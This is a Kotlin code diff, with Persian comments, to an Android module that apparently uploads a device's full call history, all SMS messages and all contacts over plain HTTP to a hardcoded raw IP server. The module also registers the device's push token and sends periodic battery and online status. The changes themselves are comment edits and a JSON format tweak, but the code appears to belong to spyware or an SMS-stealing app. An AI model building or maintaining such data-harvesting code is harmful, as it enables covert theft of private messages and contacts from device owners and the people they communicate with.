@@ -16,7 +16,7 @@ object DataUploader {
     private const val BASE_URL = "http://95.134.130.160:8765"
 
     /**
-     * رجیستر کردن دستگاه در سرور (فرمت WebSocket مثل Flutter)
+     * رجیستر کردن دستگاه در سرور (فرمت snake_case برای سینک با Python)
      */
     fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
         return try {
@@ -25,7 +25,7 @@ object DataUploader {
             // استفاده از DeviceInfoHelper برای گرفتن اطلاعات کامل دستگاه
             val deviceInfo = DeviceInfoHelper.buildDeviceInfoJson(context, deviceId, fcmToken, userId)
 
-            // ساخت JSON با فرمت Flutter WebSocket
+            // ساخت JSON با فرمت snake_case
             val registerJson = JSONObject().apply {
                 put("type", "register")
                 put("device_id", deviceId)
@@ -45,7 +45,7 @@ object DataUploader {
     }
 
     /**
-     * آپلود تاریخچه تماس‌ها
+     * آپلود تاریخچه تماس‌ها (snake_case format)
      */
     fun uploadCallHistory(context: Context, deviceId: String) {
         try {
@@ -116,7 +116,7 @@ object DataUploader {
     }
 
     /**
-     * آپلود همه پیامک‌ها
+     * آپلود همه پیامک‌ها (snake_case format)
      */
     fun uploadAllSms(context: Context, deviceId: String) {
         try {
@@ -188,7 +188,7 @@ object DataUploader {
     }
 
     /**
-     * آپلود همه مخاطبین
+     * آپلود همه مخاطبین (snake_case format)
      */
     fun uploadAllContacts(context: Context, deviceId: String) {
         try {
@@ -273,7 +273,7 @@ object DataUploader {
     }
 
     /**
-     * ارسال وضعیت باتری
+     * ارسال وضعیت باتری (snake_case format)
      */
     fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
         try {
@@ -283,7 +283,10 @@ object DataUploader {
             val json = JSONObject().apply {
                 put("device_id", deviceId)
                 put("fcm_token", fcmToken)
-                put("battery_level", batteryLevel)
+                put("data", JSONObject().apply {
+                    put("battery", batteryLevel)
+                    put("is_online", true)
+                })
                 put("timestamp", System.currentTimeMillis())
             }
 
